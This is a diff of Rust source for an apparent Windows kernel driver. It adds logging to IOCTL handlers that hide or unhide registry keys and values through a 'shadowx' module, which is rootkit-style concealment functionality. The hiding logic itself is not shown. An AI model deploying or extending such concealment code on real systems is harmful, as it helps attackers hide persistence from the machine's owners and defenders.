@@ -797,23 +797,40 @@ impl IoctlManager {
         }));
 
         // Handles IOCTL to hide or unhide a registry key.
-        self.register_handler(HIDE_UNHIDE_KEY, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
+        self.register_handler(HIDE_UNHIDE_KEY, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
             unsafe {
                 let target_registry = get_input_buffer::<TargetRegistry>(stack)?;
+                
+                // Log the incoming key and enable flag.
+                log::info!("HIDE handler: Received key: {:?}", (*target_registry).key);
+                log::info!("HIDE handler: Enable flag: {:?}", (*target_registry).enable);
+        
                 let status = shadowx::Registry::modify_key(target_registry, Type::Hide);
-
-                (*irp).IoStatus.Information = size_of::<TargetRegistry>() as u64;
+                
+                // Log the status returned from modify_key.
+                log::info!("HIDE handler: modify_key returned status: {:?}", status);
+        
+                (*irp).IoStatus.Information = core::mem::size_of::<TargetRegistry>() as u64;
                 Ok(status)
             }
         }));
+        
 
         // Handles IOCTL to hide or unhide a registry value.
-        self.register_handler(HIDE_UNHIDE_VALUE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
+        self.register_handler(HIDE_UNHIDE_VALUE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
             unsafe {
                 let target_registry = get_input_buffer::<TargetRegistry>(stack)?;
+                
+                // Log the key and enable flag for the registry value.
+                log::info!("HIDE value handler: Received key: {:?}", (*target_registry).key);
+                log::info!("HIDE value handler: Enable flag: {:?}", (*target_registry).enable);
+        
                 let status = shadowx::Registry::modify_key_value(target_registry, Type::Hide);
-
-                (*irp).IoStatus.Information = size_of::<TargetRegistry>() as u64;
+                
+                // Log the status returned from modify_key_value.
+                log::info!("HIDE value handler: modify_key_value returned status: {:?}", status);
+        
+                (*irp).IoStatus.Information = core::mem::size_of::<TargetRegistry>() as u64;
                 Ok(status)
             }
         }));
